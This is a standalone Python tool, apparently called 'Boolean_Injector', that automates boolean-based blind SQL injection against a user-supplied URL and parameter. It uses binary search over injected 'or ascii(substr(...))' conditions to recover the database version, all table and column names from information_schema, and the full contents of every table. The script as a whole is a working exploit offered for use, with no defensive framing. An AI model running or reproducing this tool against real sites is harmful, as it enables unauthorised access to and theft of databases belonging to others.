#/usr/bin/python3 
#Coded by Mr.BY13

import requests 
from prettytable import PrettyTable
global target,message,method,inject,payload

BCyan="\033[1;36m"        # Cyan
BGreen="\033[1;32m"       # Green
BRed="\033[1;31m"         # Red
BBlue="\033[1;34m"        # Blue
Green="\033[0;32m"        # Green
BYellow="\033[1;33m"      # Yellow
BPurple="\033[1;35m"      # Purple
BIGreen="\033[1;92m"      # Green

print("""
	{c}############################
	#    Boolean_Injector      #
	#                          #
	#       version 1.0        # 
	#                          #
	#           {r}Mr.BY13{c} &{r} N!NJ@{c}#
	############################
	""".format(c=BBlue,r=BRed))

target = input("{}Enter Target Url ::: {}".format(BIGreen,BPurple))
message = input("{}Enter Correct Message ::: {}".format(BIGreen,BPurple))
method = input("{}Enter Method(get or post) ::: {}".format(BIGreen,BPurple)).lower().strip()
parameters = input("{}Enter parameters ::: {}".format(BIGreen,BPurple)).split("&")
payload = {}

print("{}\nPlease Wait...{}".format(BRed,BIGreen))

for i in range(len(parameters)):#to split parameters and add to payload
	parameter = parameters[i].split("=")
	if i==0:
		inject = parameter[i]
	payload.update({parameter[0]:parameter[1]})

def method_check():#to attack with get or post
	if method == 'post':
		return requests.post(target,data=payload).text
	else:
		return requests.get(target,params=payload).text

def attack(sql):#function for attack
	found = False
	num_list = list(range(256))
	first = 0
	last = 255
	while first <= last and not found:
		mid = (first + last) // 2
		query = "{} = {} -- -".format(sql,mid)
		payload.update({inject:query})
		if message in method_check():
			found = True
			value = mid
		else:
			query = "{} > {} -- -".format(sql,mid)
			payload.update({inject:query})
			if message in method_check():
				first = mid + 1
			else:
				last = mid - 1
	return mid

def search_value(query,count):#function for extract value
	names = []
	for i in range(count):
		sql = "aksdf' or (length(({} limit {},1)))".format(query,i)
		name_length = attack(sql)
		name = ""
		for j in range(1,name_length+1):
			sql = "aksdf' or (ascii(substr(({} limit {},1),{},1)))".format(query,i,j)
			name = name + chr(attack(sql))
		names.append(name)
	return names

#for version
version = ""
version_length = attack("aklsd' or (length(version()))")
for i in range(1,version_length+1):#substr start from 1
	version_sql = "aklsd' or (ascii(substr(version(),{},1)))".format(i)
	version = version + chr(attack(version_sql))
print("{p}Version of Database ::: {y}{}{g}".format(version,y=BYellow,g=BIGreen,p=BPurple))

#to get table count 
table_count_sql = "asdfa' or (select count(table_name) from information_schema.tables where table_schema=database())"
table_count = attack(table_count_sql)

#to get table names
table_query = "select table_name from information_schema.tables where table_schema=database()"
table_names = search_value(table_query,table_count)

#for column count and names and data and output
for table_name in table_names:
	#to get column count
	column_count_sql = "asdfa' or (select count(column_name) from information_schema.columns where table_name='{}')".format(table_name)
	column_count = attack(column_count_sql)
	
	#to get column names
	column_query = "select column_name from information_schema.columns where table_name='{}'".format(table_name)
	column_names = search_value(column_query,column_count)

	#to get rows from tables
	rows_count_sql = "asdfa' or (select count(*) from {})".format(table_name)
	rows_count = attack(rows_count_sql)
	
	#to get data from each column
	output = PrettyTable()#to output with table from prettytable library
	for column_name in column_names:
		data_query = "select {} from {}".format(column_name,table_name)
		data = search_value(data_query,rows_count)
		output.add_column(column_name,data)
	print("{p}\nTable Name => {y}{t}{p}".format(t=table_name,y=BYellow,p=BPurple))
	print(output)